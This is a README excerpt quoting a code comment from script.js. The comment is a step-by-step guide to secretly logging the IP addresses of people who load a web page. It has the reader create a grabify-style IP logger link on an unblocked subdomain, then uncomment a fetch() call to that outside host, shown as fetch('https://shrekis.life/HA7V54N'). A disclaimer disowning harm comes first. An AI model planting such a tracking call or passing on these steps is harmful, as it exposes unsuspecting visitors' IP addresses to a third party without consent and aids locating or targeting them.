 ## Logging IP ADDRESSES
 Quoting from [script.js](script.js):

     /*
    GUIDE FOR ACTUALLY LOGGING IP ADDRESSES
    I, @aeiea, do not condone for any harm or illegal activities done with the information provided, and withdraw all responsibility for any damages.
        
    Now, with the legal stuff out of the way, let me show you how to log IPs.
    1: generate a grabify.link logger. you can use any site.
    2: Find a subdomain that is unblocked.
    3: set that to the subdomain.
    You should have a link somewhat like this:
    https:// [blahblah] . [blah] / [blah]
    EG:
    https://shrekis.life/HA7V54N
    Now: 
    Uncomment line 91 or smth(which should look like // fetch('{PUT GRABIFY LINK HERE}');)
    by removing the double-slash('//'), and replace the '{PUT GRABIFY LINK HERE}' with your grabify link.
    
    it should look like:
    fetch('https://shrekis.life/HA7V54N');
